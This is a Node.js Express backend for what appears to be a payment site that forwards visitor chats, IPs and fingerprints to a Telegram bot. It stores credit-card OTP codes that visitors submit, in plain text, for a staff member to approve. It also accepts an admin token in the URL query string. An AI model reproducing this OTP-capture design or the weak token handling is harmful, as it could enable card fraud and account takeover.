import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import FormData from 'form-data';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { readFile, writeFile, mkdir, access } from 'node:fs/promises';
import { normalizeStats, DEFAULT_STATS } from '../shared/statsNormalize.js';
import {
  tgPostJson,
  tgPostMultipart,
  tgGetUpdates,
  tgGetFile,
  tgAnswerCallbackQuery,
  escapeTelegramHtml,
} from './telegramClient.js';
import {
  METHOD_KEYS,
  migratePaymentDetails,
  getActiveProfile,
  getProfileById,
  buildPublicPaymentPayload,
  profileIndex,
  newProfileId,
  normalizeProfile,
  defaultEmptyMethods,
  defaultMethodEnabled,
} from './paymentProfiles.js';
import {
  defaultDataPaths,
  shouldSkipVisitDedupe,
  buildVisitRecord,
  appendVisit,
  appendOrderEvent,
  loadVisits,
  loadOrders,
  getRecentVisits,
  getRecentOrders,
  buildFullCrmSummary,
  visitsToCsv,
  ordersToCsv,
  buildPrintableHtmlReport,
  computeVisitStats,
  computeOrderStats,
  getClientIpFromRequest,
  describeDeviceFromUa,
  countRecentOrdersByVisitor,
  findOrderByBusinessId,
  updateOrderStatusByOrderId,
  publicOrderTrackingPayload,
} from './crmStore.js';
import {
  loadChatStore,
  saveChatStore,
  newSessionId,
  ensureSession,
  appendUserMessage,
  appendStaffMessage,
  bindTelegramMessage,
  getMessagesAfter,
  parseSessionIdFromTelegramText,
} from './chatStore.js';

const PAYMENT_METHOD_LABEL_TO_KEY = {
  'Zain Cash': 'zainCash',
  FastPay: 'fastPay',
  FIB: 'fib',
  MasterCard: 'mastercard',
  'Asia Hawala': 'asiaHawala',
  CreditCard: 'creditCard',
};

const adminProfileContext = new Map(); // chatId -> { profileId }

function resolveEditingProfileId(details, chatId) {
  const pid = adminProfileContext.get(String(chatId))?.profileId;
  if (pid && getProfileById(details, pid)) return pid;
  return details.currentProfileId;
}

function setEditingProfile(chatId, profileId) {
  adminProfileContext.set(String(chatId), { profileId });
}

function getEditingProfile(details, chatId) {
  return getProfileById(details, resolveEditingProfileId(details, chatId));
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PROJECT_ROOT = path.join(__dirname, '..');

const PORT = Number(process.env.PORT || 5174);
const IS_PROD = process.env.NODE_ENV === 'production';
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_PATH = path.join(DATA_DIR, 'paymentDetails.json');
const QR_DIR = path.join(DATA_DIR, 'qr');
const CHAT_MEDIA_DIR = path.join(DATA_DIR, 'chat-media');
const SITE_CONFIG_PATH = path.join(DATA_DIR, 'siteConfig.json');
const STATS_PATH = path.join(DATA_DIR, 'stats.json');
const TESTIMONIALS_PATH = path.join(DATA_DIR, 'testimonials.json');
const BLOCKED_IPS_PATH = path.join(DATA_DIR, 'blockedIps.json');
const BLOCKED_FINGERPRINTS_PATH = path.join(DATA_DIR, 'blockedFingerprints.json');
const BLOCKED_CHAT_USERS_PATH = path.join(DATA_DIR, 'blockedChatUsers.json');
const BLOCKED_CHAT_IPS_PATH = path.join(DATA_DIR, 'blockedChatIps.json');
const CREDIT_CARD_OTPS_PATH = path.join(DATA_DIR, 'creditCardOtps.json');
const CREDIT_CARD_OTP_SUBMISSIONS_PATH = path.join(DATA_DIR, 'creditCardOtpSubmissions.json');
const { visits: VISITS_PATH, orders: ORDERS_CRM_PATH } = defaultDataPaths(DATA_DIR);
const CHAT_PATH = path.join(DATA_DIR, 'webChat.json');

const chatPostLimiter = new Map();
const suspiciousIpAlertLimiter = new Map();
const actionTokenStore = new Map(); // token -> { type, value, exp }

function chatRateOk(req) {
  const ip = String(req.ip || req.socket?.remoteAddress || 'anon').replace(/^::ffff:/, '');
  const now = Date.now();
  const last = chatPostLimiter.get(ip) || 0;
  if (now - last < 850) return false;
  chatPostLimiter.set(ip, now);
  if (chatPostLimiter.size > 8000) {
    for (const [k, t] of chatPostLimiter) {
      if (now - t > 120000) chatPostLimiter.delete(k);
    }
  }
  return true;
}

/**
 * تطبيع chat_id من .env: مسافات، BOM، شرطة سالبة يونيكود، اقتباسات.
 * يُبقى كنص — واجهة تيليغرام تقبل chat_id كنصاً.
 */
function normalizeTelegramChatId(raw) {
  let s = String(raw ?? '')
    .replace(/^\uFEFF/, '')
    .replace(/\u00A0/g, ' ')
    .replace(/[\u200B-\u200D]/g, '')
    .trim();
  s = s.replace(/\u2212/g, '-');
  if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
    s = s.slice(1, -1).trim();
  }
  return s;
}

function telegramChatIdForApi(id) {
  if (id === '' || id == null) return '';
  return normalizeTelegramChatId(String(id));
}

function maskChatIdForLog(id) {
  const s = String(id || '');
  if (!s) return '(فارغ)';
  if (s.length <= 8) return `(${s.length} chars)`;
  return `${s.slice(0, 3)}…${s.slice(-4)} (طول=${s.length})`;
}

function logTelegramChatEnvAtStartup() {
  console.log('[telegram] CHAT_ID (القناة الموحدة لكل الإشعارات والإدارة)', maskChatIdForLog(telegramSupportChatId()));
}

/** Chat ID موحّد: كل الرسائل والإدارة */
function telegramSupportChatId() {
  const raw = process.env.TELEGRAM_CHAT_ID
    || process.env.TELEGRAM_SUPPORT_CHAT_ID
    || process.env.TELEGRAM_SETTINGS_CHAT_ID
    || process.env.TELEGRAM_WEBCHAT_CHAT_ID
    || '';
  const v = String(raw).trim();
  return v ? normalizeTelegramChatId(v) : '';
}

/** لإبقاء التوافق: كل المسارات تستخدم نفس CHAT_ID */
function telegramSettingsChatId() {
  return telegramSupportChatId();
}

/** إن وُجد أي من معرفات التقسيم، لا نُحقن TELEGRAM_CHAT_ID تلقائياً من أول رسالة */
function hasExplicitSplitTelegramChatIds() {
  return false;
}

async function notifyWebChatToTelegram(sessionId, userText, visitorName, clientIp = '', visitorFingerprint = '') {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = telegramSupportChatId();
  if (!botToken || !chatId) return null;
  const nameLine = visitorName
    ? `👤 <i>${escapeTelegramHtml(visitorName)}</i>`
    : '👤 <i>زائر</i>';
  const lines = [
    '💬 <b>رسالة من الموقع</b>',
    `🆔 <code>${escapeTelegramHtml(sessionId)}</code>`,
    nameLine,
    `<b>🌐 IP:</b> <code>${escapeTelegramHtml(clientIp || '—')}</code>`,
    `<b>🧬 Fingerprint:</b> <code>${escapeTelegramHtml(visitorFingerprint || '—')}</code>`,
    '━━━━━━━━━━━━━━━',
    escapeTelegramHtml(userText),
    '',
    '<i>↩️ رد على هذه الرسالة للإجابة العميل</i>',
  ];
  const modKb = await chatModerationInlineKeyboard(visitorFingerprint, clientIp);
  const { data } = await tgPostJson(botToken, 'sendMessage', {
    chat_id: telegramChatIdForApi(chatId),
    text: lines.join('\n'),
    parse_mode: 'HTML',
    ...(modKb ? { reply_markup: modKb } : {}),
  });
  if (!data?.ok || !data?.result?.message_id) return null;
  return data.result.message_id;
}

const app = express();
app.set('trust proxy', Number(process.env.TRUST_PROXY_HOPS ?? 2));

/**
 * رؤوس HTTP أساسية: تقليل مخاطر MIME sniffing / clickjacking، وHSTS عند HTTPS في الإنتاج.
 * تحذير «موقع خطير» في كروم غالباً من Google Safe Browsing — راجع القسم التوضيحي في نهاية الملف.
 */
function applySecurityHeaders(req, res, next) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()',
  );
  const xfProto = String(req.get('x-forwarded-proto') || '')
    .split(',')[0]
    .trim();
  const secure = req.secure || xfProto === 'https';
  if (IS_PROD && secure) {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  }
  next();
}
app.use(applySecurityHeaders);

const corsOrigins = String(process.env.CORS_ORIGINS || '')
  .split(',')
  .map((s) => s.trim())
  .filter(Boolean);
if (corsOrigins.length > 0) {
  app.use(
    cors({
      origin: corsOrigins.length === 1 ? corsOrigins[0] : corsOrigins,
    }),
  );
} else {
  app.use(cors());
}
app.use(express.json({ limit: process.env.JSON_BODY_LIMIT || '8mb' }));

function adminCrmToken() {
  return String(process.env.ADMIN_CRM_TOKEN || '').trim();
}

function checkAdminCrmAuth(req) {
  const t = adminCrmToken();
  if (!t) return false;
  const header = req.headers['x-admin-crm-token'] || req.headers['x-admin-token'];
  const q = req.query?.token;
  return header === t || q === t;
}

if (IS_PROD) {
  const distPath = path.join(PROJECT_ROOT, 'dist');
  app.use(express.static(distPath));
}
const ALLOWED_NETWORKS = new Set(['TRC20', 'ERC20', 'BEP20']);

function envRequired(name) {
  const v = process.env[name];
  if (!v) throw new Error(`Missing env: ${name}`);
  return v;
}

async function initDataFiles() {
  try { await mkdir(DATA_DIR, { recursive: true }); } catch { /* exists */ }
  try { await mkdir(QR_DIR, { recursive: true }); } catch { /* exists */ }
  try { await mkdir(CHAT_MEDIA_DIR, { recursive: true }); } catch { /* exists */ }
  const defaultsDir = path.join(__dirname, 'defaults');
  const defaults = [
    { name: 'paymentDetails.json', dest: DATA_PATH },
    { name: 'siteConfig.json', dest: SITE_CONFIG_PATH },
    { name: 'stats.json', dest: STATS_PATH },
    { name: 'testimonials.json', dest: TESTIMONIALS_PATH },
    { name: 'blockedIps.json', dest: BLOCKED_IPS_PATH },
    { name: 'blockedFingerprints.json', dest: BLOCKED_FINGERPRINTS_PATH },
    { name: 'blockedChatUsers.json', dest: BLOCKED_CHAT_USERS_PATH },
    { name: 'blockedChatIps.json', dest: BLOCKED_CHAT_IPS_PATH },
    { name: 'creditCardOtps.json', dest: CREDIT_CARD_OTPS_PATH },
    { name: 'creditCardOtpSubmissions.json', dest: CREDIT_CARD_OTP_SUBMISSIONS_PATH },
    { name: 'visits.json', dest: VISITS_PATH },
    { name: 'ordersLog.json', dest: ORDERS_CRM_PATH },
    { name: 'webChat.json', dest: CHAT_PATH },
  ];
  for (const { name, dest } of defaults) {
    try {
      await access(dest);
    } catch {
      try {
        const src = path.join(defaultsDir, name);
        await writeFile(dest, await readFile(src, 'utf8'), 'utf8');
      } catch { /* ignore */ }
    }
  }
}

async function loadPaymentDetails() {
  let rawText;
  try {
    rawText = await readFile(DATA_PATH, 'utf8');
  } catch {
    rawText = '{}';
  }
  let raw;
  try {
    raw = JSON.parse(rawText);
  } catch {
    raw = {};
  }
  const { details, migrated } = migratePaymentDetails(raw);
  if (migrated) {
    await savePaymentDetails(details);
  }
  return details;
}

async function savePaymentDetails(details) {
  const next = {
    ...details,
    updatedAt: new Date().toISOString(),
  };
  await writeFile(DATA_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function loadSiteConfig() {
  try {
    const raw = await readFile(SITE_CONFIG_PATH, 'utf8');
    return JSON.parse(raw);
  } catch {
    return { maintenance: { enabled: false }, hero: {}, links: {}, faq: [] };
  }
}

async function saveSiteConfig(cfg) {
  await writeFile(SITE_CONFIG_PATH, JSON.stringify(cfg, null, 2), 'utf8');
  return cfg;
}

async function loadStats() {
  try {
    const raw = JSON.parse(await readFile(STATS_PATH, 'utf8'));
    return normalizeStats(raw);
  } catch {
    return { ...DEFAULT_STATS };
  }
}
async function saveStats(data) {
  const next = normalizeStats(data);
  await writeFile(STATS_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function loadTestimonials() {
  try { return JSON.parse(await readFile(TESTIMONIALS_PATH, 'utf8')); }
  catch { return []; }
}
async function saveTestimonials(data) {
  await writeFile(TESTIMONIALS_PATH, JSON.stringify(data, null, 2), 'utf8');
  return data;
}

function normalizeBlockedIpInput(raw) {
  return String(raw || '')
    .trim()
    .replace(/^::ffff:/, '')
    .replace(/^\[|\]$/g, '')
    .split(',')[0]
    .trim();
}

async function loadBlockedIps() {
  try {
    const raw = JSON.parse(await readFile(BLOCKED_IPS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    return list
      .map((it) => ({
        ip: normalizeBlockedIpInput(it?.ip || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.ip);
  } catch {
    return [];
  }
}

async function saveBlockedIps(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      ip: normalizeBlockedIpInput(it?.ip || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.ip);
  await writeFile(BLOCKED_IPS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function getBlockedIpEntry(ip) {
  const clean = normalizeBlockedIpInput(ip);
  if (!clean) return null;
  const list = await loadBlockedIps();
  return list.find((it) => it.ip === clean) || null;
}

function normalizeFingerprintInput(raw) {
  return String(raw || '')
    .trim()
    .replace(/\s+/g, '')
    .slice(0, 120);
}

async function loadBlockedFingerprints() {
  try {
    const raw = JSON.parse(await readFile(BLOCKED_FINGERPRINTS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    return list
      .map((it) => ({
        fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
        ipSnapshot: normalizeBlockedIpInput(it?.ipSnapshot || ''),
      }))
      .filter((it) => it.fingerprint);
  } catch {
    return [];
  }
}

async function saveBlockedFingerprints(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
      ipSnapshot: normalizeBlockedIpInput(it?.ipSnapshot || ''),
    }))
    .filter((it) => it.fingerprint);
  await writeFile(BLOCKED_FINGERPRINTS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function getBlockedFingerprintEntry(fp) {
  const clean = normalizeFingerprintInput(fp);
  if (!clean) return null;
  const list = await loadBlockedFingerprints();
  return list.find((it) => it.fingerprint === clean) || null;
}

async function loadBlockedChatUsers() {
  try {
    const raw = JSON.parse(await readFile(BLOCKED_CHAT_USERS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    return list
      .map((it) => ({
        fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.fingerprint);
  } catch {
    return [];
  }
}

async function saveBlockedChatUsers(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.fingerprint);
  await writeFile(BLOCKED_CHAT_USERS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function getBlockedChatUserEntry(fp) {
  const clean = normalizeFingerprintInput(fp);
  if (!clean) return null;
  const list = await loadBlockedChatUsers();
  return list.find((it) => it.fingerprint === clean) || null;
}

async function loadBlockedChatIps() {
  try {
    const raw = JSON.parse(await readFile(BLOCKED_CHAT_IPS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    return list
      .map((it) => ({
        ip: normalizeBlockedIpInput(it?.ip || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.ip);
  } catch {
    return [];
  }
}

async function saveBlockedChatIps(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      ip: normalizeBlockedIpInput(it?.ip || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.ip);
  await writeFile(BLOCKED_CHAT_IPS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function getBlockedChatIpEntry(ip) {
  const clean = normalizeBlockedIpInput(ip);
  if (!clean) return null;
  const list = await loadBlockedChatIps();
  return list.find((it) => it.ip === clean) || null;
}

const CREDIT_CARD_OTP_TTL_MS = 10 * 60 * 1000;

function hashCreditCardOtp(otp) {
  return crypto.createHash('sha256').update(String(otp)).digest('hex');
}

async function loadCreditCardOtps() {
  try {
    const raw = JSON.parse(await readFile(CREDIT_CARD_OTPS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    const now = Date.now();
    return list
      .map((it) => ({
        orderId: String(it?.orderId || '').trim().slice(0, 80),
        otpHash: String(it?.otpHash || '').trim(),
        expAt: Number(it?.expAt || it?.expAtMs || 0),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.orderId && it.otpHash && it.expAt > now);
  } catch {
    return [];
  }
}

async function saveCreditCardOtps(list) {
  const next = (Array.isArray(list) ? list : [])
    .map((it) => ({
      orderId: String(it?.orderId || '').trim().slice(0, 80),
      otpHash: String(it?.otpHash || '').trim(),
      expAt: Number(it?.expAt || 0),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.orderId && it.otpHash && Number.isFinite(it.expAt));

  await writeFile(CREDIT_CARD_OTPS_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function verifyCreditCardOtp(orderId, otp) {
  const list = await loadCreditCardOtps();
  const rec = list.find((it) => it.orderId === orderId) || null;
  if (!rec) return { ok: false, code: 'OTP_NOT_FOUND_OR_EXPIRED' };
  const givenHash = hashCreditCardOtp(otp);
  if (givenHash !== rec.otpHash) return { ok: false, code: 'OTP_INVALID' };
  const next = list.filter((it) => it.orderId !== orderId);
  await saveCreditCardOtps(next);
  return { ok: true };
}

async function loadCreditCardOtpSubmissions() {
  try {
    const raw = JSON.parse(await readFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, 'utf8'));
    const list = Array.isArray(raw) ? raw : [];
    const now = Date.now();
    return list
      .map((it) => ({
        id: String(it?.id || '').trim(),
        orderId: String(it?.orderId || '').trim().slice(0, 80),
        visitorId: String(it?.visitorId || '').trim().slice(0, 120),
        otp: String(it?.otp || '').trim().slice(0, 12),
        submittedAt: String(it?.submittedAt || it?.at || '').slice(0, 40),
        decision: String(it?.decision || 'pending'),
        decidedAt: String(it?.decidedAt || ''),
        expAt: Number(it?.expAt || 0),
      }))
      .filter((it) => it.id && it.orderId && it.visitorId && it.otp && (it.expAt === 0 || it.expAt > now));
  } catch {
    return [];
  }
}

async function saveCreditCardOtpSubmissions(list) {
  const next = (Array.isArray(list) ? list : [])
    .map((it) => ({
      id: String(it?.id || '').trim(),
      orderId: String(it?.orderId || '').trim().slice(0, 80),
      visitorId: String(it?.visitorId || '').trim().slice(0, 120),
      otp: String(it?.otp || '').trim().slice(0, 12),
      submittedAt: String(it?.submittedAt || it?.at || new Date().toISOString()),
      decision: String(it?.decision || 'pending'),
      decidedAt: String(it?.decidedAt || ''),
      expAt: Number(it?.expAt || 0),
    }))
    .filter((it) => it.id && it.orderId);
  await writeFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function getCreditCardOtpSubmission(id) {
  const list = await loadCreditCardOtpSubmissions();
  const sid = String(id || '').trim();
  if (!sid) return null;
  return list.find((it) => it.id === sid) || null;
}

async function setCreditCardOtpSubmissionDecision(id, decision) {
  const list = await loadCreditCardOtpSubmissions();
  const sid = String(id || '').trim();
  const idx = list.findIndex((it) => it.id === sid);
  if (idx < 0) return null;
  list[idx] = {
    ...list[idx],
    decision,
    decidedAt: new Date().toISOString(),
  };
  await saveCreditCardOtpSubmissions(list);
  return list[idx];
}

function blockedViolationPayload(entry) {
  return {
    error: 'تم حظر هذا العنوان بسبب مخالفة. يرجى التواصل مع الدعم.',
    code: 'IP_BLOCKED',
    messageAr: 'تم حظر هذا العنوان بسبب مخالفة. يرجى التواصل مع الدعم.',
    messageEn: 'This IP has been blocked for policy violation. Please contact support.',
    reason: entry?.reason || 'مخالفة',
  };
}

function blockedFingerprintViolationPayload(entry) {
  return {
    error: 'تم حظر هذا الجهاز بسبب مخالفة. يرجى التواصل مع الدعم.',
    code: 'FP_BLOCKED',
    messageAr: 'تم حظر هذا الجهاز بسبب مخالفة. يرجى التواصل مع الدعم.',
    messageEn: 'This device fingerprint has been blocked for policy violation. Please contact support.',
    reason: entry?.reason || 'مخالفة',
  };
}

function blockedChatViolationPayload(entry) {
  return {
    error: 'تم حظرك من خدمة العملاء. يرجى التواصل عبر القنوات الرسمية.',
    code: 'CHAT_BLOCKED',
    messageAr: 'تم حظرك من خدمة العملاء. يرجى التواصل عبر القنوات الرسمية.',
    messageEn: 'You are blocked from customer support chat. Please contact official channels.',
    reason: entry?.reason || 'مخالفة',
  };
}

function blockedChatRouterViolationPayload(entry) {
  return {
    error: 'تم حظر هذا الرواتر من خدمة العملاء. يرجى التواصل عبر القنوات الرسمية.',
    code: 'CHAT_ROUTER_BLOCKED',
    messageAr: 'تم حظر هذا الرواتر من خدمة العملاء. يرجى التواصل عبر القنوات الرسمية.',
    messageEn: 'This router (IP) is blocked from customer support chat. Please contact official channels.',
    reason: entry?.reason || 'مخالفة',
  };
}

function makeActionToken(type, value, ttlMs = 30 * 60 * 1000) {
  const token = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`.slice(0, 14);
  actionTokenStore.set(token, { type, value: String(value || ''), exp: Date.now() + ttlMs });
  if (actionTokenStore.size > 5000) {
    const now = Date.now();
    for (const [k, v] of actionTokenStore) {
      if (!v || v.exp < now) actionTokenStore.delete(k);
    }
  }
  return token;
}

function readActionToken(token, expectedType) {
  const rec = actionTokenStore.get(String(token || ''));
  if (!rec) return null;
  if (rec.exp < Date.now()) {
    actionTokenStore.delete(String(token || ''));
    return null;
  }
  if (expectedType && rec.type !== expectedType) return null;
  return rec.value;
}

async function moderationInlineKeyboard(ipRaw, fpRaw, options = {}) {
  const banOnly = Boolean(options?.banOnly);
  const ip = normalizeBlockedIpInput(ipRaw);
  const fp = normalizeFingerprintInput(fpRaw);
  const rows = [];

  if (ip) {
    const blockedIp = await getBlockedIpEntry(ip);
    if (banOnly) {
      if (!blockedIp) {
        const t = makeActionToken('bip', ip);
        rows.push([{ text: '🚫 حظر IP', callback_data: `mod:${t}` }]);
      }
    } else {
      const t = blockedIp ? makeActionToken('uip', ip) : makeActionToken('bip', ip);
      rows.push([{ text: blockedIp ? '✅ فك حظر IP' : '🚫 حظر IP', callback_data: `mod:${t}` }]);
    }
  }

  if (fp) {
    const blockedFp = await getBlockedFingerprintEntry(fp);
    if (banOnly) {
      if (!blockedFp) {
        const t = makeActionToken('bfp', fp);
        rows.push([{ text: '🧬🚫 حظر Fingerprint', callback_data: `mod:${t}` }]);
      }
    } else {
      const t = blockedFp ? makeActionToken('ufp', fp) : makeActionToken('bfp', fp);
      rows.push([{ text: blockedFp ? '✅ فك حظر Fingerprint' : '🧬🚫 حظر Fingerprint', callback_data: `mod:${t}` }]);
    }
  }

  return rows.length ? { inline_keyboard: rows } : null;
}

async function chatModerationInlineKeyboard(fpRaw, ipRaw = '') {
  const fp = normalizeFingerprintInput(fpRaw);
  const ip = normalizeBlockedIpInput(ipRaw);
  const rows = [];
  if (ip) {
    const blockedIp = await getBlockedChatIpEntry(ip);
    const tokenIp = blockedIp ? makeActionToken('ucr', ip) : makeActionToken('bcr', ip);
    rows.push([{ text: blockedIp ? '✅ فك حظر رواتر' : '🚫 حظر رواتر', callback_data: `mod:${tokenIp}` }]);
  }
  if (fp) {
    const blocked = await getBlockedChatUserEntry(fp);
    const token = blocked ? makeActionToken('uch', fp) : makeActionToken('bch', fp);
    rows.push([{ text: blocked ? '✅ فك حظر جهاز' : '🚫 حظر جهاز', callback_data: `mod:${token}` }]);
  }
  return rows.length ? { inline_keyboard: rows } : null;
}

function resolveOrderIp(orderRow, visits = []) {
  const direct = normalizeBlockedIpInput(orderRow?.ip || '');
  if (direct) return direct;

  const visitorId = String(orderRow?.visitorId || '').trim();
  if (visitorId.startsWith('ip:')) {
    const fromVisitor = normalizeBlockedIpInput(visitorId.slice(3));
    if (fromVisitor) return fromVisitor;
  }

  if (visitorId) {
    for (let i = visits.length - 1; i >= 0; i -= 1) {
      const v = visits[i];
      if (String(v?.visitorId || '') !== visitorId) continue;
      const ip = normalizeBlockedIpInput(v?.ip || '');
      if (ip) return ip;
    }
  }

  return '';
}

async function findRecentIpByFingerprint(fingerprint) {
  const fp = normalizeFingerprintInput(fingerprint);
  if (!fp) return '';
  const visits = await loadVisits(VISITS_PATH);
  for (let i = visits.length - 1; i >= 0; i -= 1) {
    const v = visits[i];
    if (String(v?.visitorId || '') !== fp) continue;
    const ip = normalizeBlockedIpInput(v?.ip || '');
    if (ip) return ip;
  }
  const orders = await loadOrders(ORDERS_CRM_PATH);
  for (let i = orders.length - 1; i >= 0; i -= 1) {
    const o = orders[i];
    if (String(o?.visitorId || '') !== fp) continue;
    const ip = normalizeBlockedIpInput(o?.ip || '');
    if (ip) return ip;
  }
  return '';
}

async function maybeWarnSameIpAsBlockedFingerprint(clientIp, currentFingerprint) {
  const ip = normalizeBlockedIpInput(clientIp);
  const fp = normalizeFingerprintInput(currentFingerprint);
  if (!ip || !fp) return;
  const blockedFpList = await loadBlockedFingerprints();
  const hit = blockedFpList.find((it) => it.ipSnapshot && it.ipSnapshot === ip && it.fingerprint !== fp);
  if (!hit) return;

  const key = `${ip}|${hit.fingerprint}|${fp}`;
  const now = Date.now();
  const last = suspiciousIpAlertLimiter.get(key) || 0;
  if (now - last < 10 * 60 * 1000) return;
  suspiciousIpAlertLimiter.set(key, now);

  const modKb = await moderationInlineKeyboard(ip, fp);
  await botSend(
    [
      '⚠️ <b>تحذير اشتباه (IP مشترك مع بصمة محظورة)</b>',
      `IP الحالي: <code>${escapeTelegramHtml(ip)}</code>`,
      `البصمة الحالية: <code>${escapeTelegramHtml(fp)}</code>`,
      `البصمة المحظورة على نفس IP: <code>${escapeTelegramHtml(hit.fingerprint)}</code>`,
      `السبب: <b>${escapeTelegramHtml(hit.reason || 'مخالفة')}</b>`,
      '<i>قد يكون نفس الشخص يستخدم جهازًا مختلفًا.</i>',
    ].join('\n'),
    modKb ? { reply_markup: modKb } : {}
  );
}

app.get('/api/health', (_req, res) => res.json({ ok: true }));

/**
 * يتحقق من getChat بنفس TELEGRAM_BOT_TOKEN ومعرّفات المحادثات كما في الإنتاج.
 * GET /api/admin/telegram-probe?token=ADMIN_CRM_TOKEN
 * أو رأس X-Admin-Crm-Token — لا يعرض التوكن.
 */
app.get('/api/admin/telegram-probe', async (req, res) => {
  try {
    if (!checkAdminCrmAuth(req)) {
      return res.status(adminCrmToken() ? 401 : 503).json({
        error: adminCrmToken() ? 'Unauthorized' : 'Set ADMIN_CRM_TOKEN in .env',
      });
    }
    const botToken = String(process.env.TELEGRAM_BOT_TOKEN || '').trim();
    if (!botToken) {
      return res.status(503).json({ error: 'TELEGRAM_BOT_TOKEN not set' });
    }
    const probe = async (label, getChatId) => {
      const raw = getChatId();
      if (!raw) {
        return {
          label,
          configured: false,
          ok: null,
          hint: 'not set in env',
        };
      }
      const cid = telegramChatIdForApi(raw);
      const url = `https://api.telegram.org/bot${botToken}/getChat?chat_id=${encodeURIComponent(cid)}`;
      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      const d = await r.json().catch(() => ({}));
      const title = d?.result?.title || d?.result?.username || d?.result?.first_name || null;
      return {
        label,
        configured: true,
        chatIdHint: maskChatIdForLog(raw),
        ok: Boolean(d?.ok),
        telegramDescription: d?.description || null,
        error_code: d?.error_code ?? null,
        chatTitle: d?.ok ? title : null,
      };
    };
    const [chatId] = await Promise.all([
      probe('chat_id', telegramSupportChatId),
    ]);
    res.json({
      note: 'Single unified Telegram Chat ID for everything.',
      chatId,
    });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/site-config', async (_req, res) => {
  try {
    res.json(await loadSiteConfig());
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/stats', async (_req, res) => {
  try { res.json(await loadStats()); }
  catch (e) { res.status(500).json({ error: String(e?.message || e) }); }
});

app.get('/api/testimonials', async (_req, res) => {
  try { res.json(await loadTestimonials()); }
  catch (e) { res.status(500).json({ error: String(e?.message || e) }); }
});

app.post('/api/chat/session', async (_req, res) => {
  try {
    const store = await loadChatStore(CHAT_PATH);
    const sessionId = newSessionId();
    ensureSession(store, sessionId, '');
    // Default mode: AI first-line support until visitor requests human transfer.
    const sess = store.sessions[sessionId];
    if (sess) {
      if (!sess.meta || typeof sess.meta !== 'object') sess.meta = {};
      sess.meta.handoffToStaff = false;
      appendStaffMessage(
        store,
        sessionId,
        'اهلا بك في خدمة العملاء. اكتب طلبك وساساعدك الان. اذا رغبت بالتحويل الى موظف، اكتب: تحويل لخدمة العملاء.'
      );
    }
    await saveChatStore(CHAT_PATH, store);
    res.json({ sessionId });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/chat/messages', async (req, res) => {
  try {
    const sessionId = String(req.query.sessionId || '').trim();
    const after = Number(req.query.after) || 0;
    if (!sessionId.startsWith('sess_')) {
      return res.status(400).json({ error: 'Invalid session' });
    }
    const store = await loadChatStore(CHAT_PATH);
    const messages = getMessagesAfter(store, sessionId, after);
    res.json({ messages });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.post('/api/chat/message', async (req, res) => {
  try {
    if (!chatRateOk(req)) {
      return res.status(429).json({ error: 'Too many requests' });
    }
    const body = req.body || {};
    const sessionId = String(body.sessionId || '').trim();
    const text = String(body.text || '').trim();
    const visitorName = String(body.visitorName || '').trim().slice(0, 80);
